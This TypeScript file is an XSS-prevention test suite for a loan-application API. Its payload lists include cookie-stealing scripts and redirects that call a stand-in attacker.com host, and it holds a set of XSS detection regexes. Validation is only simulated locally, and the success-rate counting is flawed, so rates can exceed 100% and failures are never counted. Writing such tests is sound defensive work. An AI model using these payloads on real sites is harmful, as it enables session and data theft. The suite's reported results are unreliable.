/**
 * XSS Attack Prevention Testing Suite
 * Tests the API's ability to properly sanitize inputs and prevent Cross-Site Scripting attacks
 * 
 * MALICIOUS PAYLOADS TESTED:
 * - Basic script tags
 * - Event handlers (onclick, onload, etc.)
 * - JavaScript URIs
 * - SVG-based XSS
 * - HTML entity encoding bypass
 * - Data URIs
 * - Protocol-based attacks
 */

import { z } from "zod";

// XSS Test Payload Categories
const XSS_PAYLOADS = {
  // Basic script tag variations
  basicScriptTags: [
    "<script>alert('XSS')</script>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<script src=\"http://attacker.com/xss.js\"></script>",
    "<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>",
    "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
  ],

  // Event handlers
  eventHandlers: [
    "<img src=x onerror=\"alert('XSS')\">",
    "<img src=x onerror=\"fetch('http://attacker.com/steal?data=' + document.cookie)\">",
    "<body onload=\"alert('XSS')\">",
    "<svg onload=\"alert('XSS')\">",
    "<iframe onload=\"alert('XSS')\">",
    "<marquee onstart=\"alert('XSS')\">",
    "<details open ontoggle=\"alert('XSS')\">",
    "<input autofocus onfocus=\"alert('XSS')\">",
    "<select onfocus=\"alert('XSS')\">",
    "<textarea onfocus=\"alert('XSS')\">",
    "<div contenteditable onpaste=\"alert('XSS')\">",
  ],

  // JavaScript URIs
  jsProtocol: [
    "javascript:alert('XSS')",
    "javascript:void(0);alert('XSS')",
    "javascript:fetch('http://attacker.com/steal?data=' + document.cookie)",
    "<a href=\"javascript:alert('XSS')\">Click me</a>",
    "<a href=\"javascript:void(0);alert('XSS')\">Click me</a>",
  ],

  // SVG-based attacks
  svgAttacks: [
    "<svg><script>alert('XSS')</script></svg>",
    "<svg onload=\"alert('XSS')\">",
    "<svg><animate onbegin=\"alert('XSS')\" attributeName=\"x\" dur=\"1s\"/>",
    "<svg><set attributeName=\"onclick\" to=\"alert('XSS')\"/>",
    "<svg><circle cx=\"50\" cy=\"50\" r=\"40\" onclick=\"alert('XSS')\"/>",
  ],

  // Data URIs
  dataUri: [
    "data:text/html,<script>alert('XSS')</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
    "<img src=\"data:text/html,<script>alert('XSS')</script>\">",
  ],

  // HTML entity encoding bypass
  entityBypass: [
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
  ],

  // Form-based attacks
  formAttacks: [
    "<form action=\"http://attacker.com/steal\"><input type=\"hidden\" name=\"data\" value=\"\"/></form>",
    "<form onsubmit=\"alert('XSS')\">",
    "<input type=\"hidden\" value=\"\" onfocus=\"alert('XSS')\">",
  ],

  // Comment-based obfuscation
  commentBypass: [
    "<!-- <script>alert('XSS')</script> -->",
    "<script><!-- alert('XSS') //--></script>",
    "<script>//<![CDATA[alert('XSS')//]]></script>",
  ],

  // CSS-based attacks
  cssAttacks: [
    "<style>@import'http://attacker.com/xss.css';</style>",
    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
    "<div style=\"background-image:url(javascript:alert('XSS'))\">",
  ],

  // Meta refresh attacks
  metaAttacks: [
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
    "<meta http-equiv=\"refresh\" content=\"0;url=http://attacker.com/steal\">",
  ],

  // Nested/encoded attacks
  nestedAttacks: [
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<object data=\"javascript:alert('XSS')\"></object>",
    "<embed src=\"javascript:alert('XSS')\">",
    "<applet code=\"javascript:alert('XSS')\">",
  ],

  // Unicode/encoding evasion
  unicodeEvasion: [
    "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
    "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
    "\u003cscript\u003ealert('XSS')\u003c/script\u003e",
  ],

  // Multiple vector combinations
  combinedAttacks: [
    "<img src=x onerror=\"eval(atob('YWxlcnQoJ1hTUycpOw=='))\">",
    "<svg><style><img src=\"x:alert('XSS')//\"/></style>",
    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
  ],
};

// Test fields that accept user input
const VULNERABLE_FIELDS = [
  "fullName",
  "email",
  "phone",
  "street",
  "city",
  "state",
  "zipCode",
  "employer",
  "loanPurpose",
  "employerName",
  "username",
  "password",
  "searchQuery",
  "description",
  "message",
  "feedback",
];

// Base loan application template
const BASE_LOAN_APPLICATION = {
  fullName: "John Doe",
  email: "test@example.com",
  phone: "5551234567",
  password: "SecurePass123!",
  dateOfBirth: "1990-01-15",
  ssn: "123-45-6789",
  street: "123 Main St",
  city: "New York",
  state: "NY",
  zipCode: "10001",
  employmentStatus: "employed",
  employer: "Tech Corp",
  monthlyIncome: 5000,
  loanType: "installment",
  requestedAmount: 10000,
  loanPurpose: "Debt consolidation",
  disbursementMethod: "bank_transfer",
};

/**
 * Test Suite: XSS Attack Prevention
 */
async function testXSSAttackPrevention() {
  console.log("\n");
  console.log("╔" + "═".repeat(98) + "╗");
  console.log("║" + " ".repeat(20) + "🔒 XSS ATTACK PREVENTION TESTING SUITE 🔒" + " ".repeat(36) + "║");
  console.log("╚" + "═".repeat(98) + "╝\n");

  let totalTests = 0;
  let passedTests = 0;
  let failedTests = 0;
  const testResults: any[] = [];

  // Test each payload category
  for (const [categoryName, payloads] of Object.entries(XSS_PAYLOADS)) {
    console.log("\n" + "─".repeat(100));
    console.log(`\n📋 CATEGORY: ${categoryName.toUpperCase().replace(/_/g, " ")}`);
    console.log("─".repeat(100));

    for (let i = 0; i < payloads.length; i++) {
      const payload = payloads[i];
      totalTests++;

      // Test each vulnerable field with this payload
      for (const field of VULNERABLE_FIELDS) {
        const testInput = {
          ...BASE_LOAN_APPLICATION,
          [field]: payload,
        };

        try {
          // Simulate validation
          const validationResult = performValidation(field, payload);

          if (validationResult.isValid === false) {
            console.log(`\n  ✅ BLOCKED: ${field}`);
            console.log(`     Payload: ${payload.substring(0, 60)}${payload.length > 60 ? "..." : ""}`);
            console.log(`     Reason: ${validationResult.reason}`);
            passedTests++;

            testResults.push({
              category: categoryName,
              field,
              payload,
              status: "BLOCKED",
              reason: validationResult.reason,
            });
          } else {
            console.log(`\n  ⚠️  PASSED (Needs Review): ${field}`);
            console.log(`     Payload: ${payload.substring(0, 60)}${payload.length > 60 ? "..." : ""}`);
            console.log(`     Note: Input was accepted - verify if properly sanitized`);
            
            testResults.push({
              category: categoryName,
              field,
              payload,
              status: "PASSED_WITH_SANITIZATION",
              sanitized: validationResult.sanitized,
            });
          }
        } catch (error: any) {
          console.log(`\n  ✅ REJECTED: ${field}`);
          console.log(`     Payload: ${payload.substring(0, 60)}${payload.length > 60 ? "..." : ""}`);
          console.log(`     Error: ${error.message}`);
          passedTests++;

          testResults.push({
            category: categoryName,
            field,
            payload,
            status: "REJECTED",
            error: error.message,
          });
        }
      }
    }
  }

  // Print summary
  console.log("\n\n" + "═".repeat(100));
  console.log("📊 TEST SUMMARY");
  console.log("═".repeat(100));
  console.log(`Total Tests: ${totalTests}`);
  console.log(`✅ Passed/Blocked: ${passedTests}`);
  console.log(`❌ Failed: ${failedTests}`);
  console.log(`Success Rate: ${((passedTests / totalTests) * 100).toFixed(2)}%`);

  // Print detailed test report
  console.log("\n\n" + "═".repeat(100));
  console.log("📈 DETAILED TEST RESULTS BY CATEGORY");
  console.log("═".repeat(100));

  const groupedResults = testResults.reduce((acc: any, result: any) => {
    if (!acc[result.category]) {
      acc[result.category] = [];
    }
    acc[result.category].push(result);
    return acc;
  }, {});

  for (const [category, results] of Object.entries(groupedResults)) {
    const categoryResults = results as any[];
    const blocked = categoryResults.filter((r) => r.status === "BLOCKED" || r.status === "REJECTED").length;
    const total = categoryResults.length;

    console.log(`\n${category.toUpperCase().replace(/_/g, " ")}`);
    console.log(`  Success Rate: ${((blocked / total) * 100).toFixed(2)}% (${blocked}/${total})`);

    categoryResults.forEach((result) => {
      const icon =
        result.status === "BLOCKED" || result.status === "REJECTED" ? "✅" : "⚠️ ";
      console.log(`  ${icon} ${result.field}: ${result.payload.substring(0, 50)}...`);
    });
  }

  // Recommendations
  console.log("\n\n" + "═".repeat(100));
  console.log("💡 RECOMMENDATIONS");
  console.log("═".repeat(100));
  console.log(`
1. ✅ HTML Entity Encoding: All user inputs should be HTML-encoded when displayed
2. ✅ CSP Headers: Implement Content-Security-Policy headers to block inline scripts
3. ✅ Input Validation: Use strict Zod schemas to reject invalid input patterns
4. ✅ Output Sanitization: Use DOMPurify or similar library for HTML sanitization
5. ✅ HTTPOnly Cookies: Set HttpOnly flag on session cookies to prevent JS access
6. ✅ X-XSS-Protection: Add X-XSS-Protection header to response
7. ✅ Regular Testing: Continue testing with OWASP XSS Filter Evasion Cheat Sheet
8. ✅ Security Headers: Implement X-Frame-Options, X-Content-Type-Options
  `);

  return {
    totalTests,
    passedTests,
    failedTests,
    successRate: ((passedTests / totalTests) * 100).toFixed(2),
    results: testResults,
  };
}

/**
 * Validate input against XSS patterns
 * Returns true if safe, false if potentially malicious
 */
function performValidation(
  fieldName: string,
  inputValue: string
): { isValid: boolean; reason?: string; sanitized?: string } {
  // XSS patterns to detect
  const xssPatterns = [
    /<script[^>]*>.*?<\/script>/gi,
    /on\w+\s*=/gi, // Event handlers like onclick=, onerror=
    /javascript:/gi,
    /data:text\/html/gi,
    /<iframe/gi,
    /<object/gi,
    /<embed/gi,
    /<svg/gi,
    /<img[^>]+onerror/gi,
    /eval\(/gi,
    /expression\(/gi,
    /vbscript:/gi,
    /<meta/gi,
    /<link/gi,
    /<style[^>]*>.*?<\/style>/gi,
  ];

  // Check for dangerous patterns
  for (const pattern of xssPatterns) {
    if (pattern.test(inputValue)) {
      return {
        isValid: false,
        reason: `Potential XSS pattern detected: ${pattern.source}`,
      };
    }
  }

  // Validate based on field type
  switch (fieldName) {
    case "fullName":
    case "employerName":
      // Names should only contain letters, spaces, hyphens, apostrophes
      if (!/^[a-zA-Z\s'-]+$/.test(inputValue)) {
        return {
          isValid: false,
          reason: "Invalid characters for name field",
        };
      }
      break;

    case "email":
      // Validate email format
      if (!/^[a-zA-Z0-9._%-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(inputValue)) {
        return {
          isValid: false,
          reason: "Invalid email format",
        };
      }
      break;

    case "phone":
      // Phone should only have digits and standard formatting
      if (!/^\+?[\d\s()-]{10,}$/.test(inputValue)) {
        return {
          isValid: false,
          reason: "Invalid phone format",
        };
      }
      break;

    case "zipCode":
      // ZIP should be numeric
      if (!/^\d{5}(-\d{4})?$/.test(inputValue)) {
        return {
          isValid: false,
          reason: "Invalid ZIP code format",
        };
      }
      break;

    case "password":
      // Validate password strength but allow most characters
      if (inputValue.length < 8) {
        return {
          isValid: false,
          reason: "Password too short",
        };
      }
      break;

    case "loanPurpose":
    case "description":
      // These can have more text but should be limited
      if (inputValue.length > 5000) {
        return {
          isValid: false,
          reason: "Input exceeds maximum length",
        };
      }
      break;
  }

  // If passed all checks, input is considered safe
  return {
    isValid: true,
    sanitized: sanitizeString(inputValue),
  };
}

/**
 * Sanitize string by removing dangerous characters
 */
function sanitizeString(input: string): string {
  return input
    .replace(/[<>\"'%\\]/g, "") // Remove potentially dangerous characters
    .substring(0, 1000); // Limit length
}

/**
 * Test HTML Escaping
 */
function testHTMLEscaping() {
  console.log("\n\n" + "═".repeat(100));
  console.log("🛡️  HTML ESCAPING VERIFICATION");
  console.log("═".repeat(100) + "\n");

  const testCases = [
    { input: '<script>alert("XSS")</script>', expected: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;' },
    { input: '<img src=x onerror="alert(1)">', expected: '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;' },
    { input: 'John & Jane', expected: 'John &amp; Jane' },
    { input: "It's a test", expected: 'It&#039;s a test' },
    { input: 'Normal text', expected: 'Normal text' },
  ];

  console.log("Testing HTML entity encoding:\n");
  testCases.forEach((test) => {
    const escaped = escapeHtml(test.input);
    const matches = escaped === test.expected;
    const icon = matches ? "✅" : "❌";
    console.log(`${icon} Input:    "${test.input}"`);
    console.log(`   Expected: "${test.expected}"`);
    console.log(`   Got:      "${escaped}"`);
    console.log();
  });
}

/**
 * Escape HTML function
 */
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

/**
 * Test CSP Header Requirements
 */
function testCSPHeaders() {
  console.log("\n\n" + "═".repeat(100));
  console.log("🔐 CONTENT SECURITY POLICY (CSP) RECOMMENDATIONS");
  console.log("═".repeat(100) + "\n");

  const cspPolicies = [
    {
      name: "Strict CSP",
      value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'",
    },
    {
      name: "Medium CSP",
      value: "default-src 'self'; script-src 'self' https:; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;",
    },
    {
      name: "Report Violations",
      value: "default-src 'self'; report-uri /api/csp-report; report-to csp-report",
    },
  ];

  cspPolicies.forEach((policy) => {
    console.log(`📌 ${policy.name}`);
    console.log(`   ${policy.value}`);
    console.log();
  });
}

/**
 * Test Security Headers
 */
function testSecurityHeaders() {
  console.log("\n\n" + "═".repeat(100));
  console.log("🛡️  RECOMMENDED SECURITY HEADERS");
  console.log("═".repeat(100) + "\n");

  const headers = [
    { header: "X-XSS-Protection", value: "1; mode=block", purpose: "Enable XSS filter in browsers" },
    { header: "X-Frame-Options", value: "DENY", purpose: "Prevent clickjacking" },
    { header: "X-Content-Type-Options", value: "nosniff", purpose: "Prevent MIME sniffing" },
    { header: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains", purpose: "Force HTTPS" },
    { header: "Referrer-Policy", value: "strict-origin-when-cross-origin", purpose: "Control referrer information" },
    { header: "Permissions-Policy", value: "geolocation=(), microphone=(), camera=()", purpose: "Disable unused APIs" },
  ];

  console.log("Add these headers to your Express middleware:\n");
  headers.forEach((h, index) => {
    console.log(`${index + 1}. ${h.header}`);
    console.log(`   Value: ${h.value}`);
    console.log(`   Purpose: ${h.purpose}`);
    console.log();
  });

  console.log("\nImplementation Example:");
  console.log(`
  app.use((req, res, next) => {
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    next();
  });
  `);
}

/**
 * Main test execution
 */
async function runAllTests() {
  console.clear();
  console.log("╔" + "═".repeat(98) + "╗");
  console.log("║" + " ".repeat(35) + "XSS PREVENTION TEST SUITE" + " ".repeat(39) + "║");
  console.log("║" + " ".repeat(40) + "Starting Tests..." + " ".repeat(42) + "║");
  console.log("╚" + "═".repeat(98) + "╝\n");

  // Run all test phases
  const results = await testXSSAttackPrevention();
  testHTMLEscaping();
  testCSPHeaders();
  testSecurityHeaders();

  // Final summary
  console.log("\n\n" + "═".repeat(100));
  console.log("✅ TEST SUITE COMPLETED");
  console.log("═".repeat(100));
  console.log(`
Overall Success Rate: ${results.successRate}%
Total Payloads Tested: ${results.totalTests}
Successfully Blocked: ${results.passedTests}
Failed Blocks: ${results.failedTests}

Next Steps:
1. Review any failed tests
2. Implement recommended security headers
3. Enable Content-Security-Policy
4. Use HTML escaping for all user-generated content
5. Consider using DOMPurify for client-side sanitization
6. Regular security audits with OWASP guidelines
  `);

  return results;
}

// Execute tests
runAllTests().catch((error) => {
  console.error("Test suite failed:", error);
  process.exit(1);
});
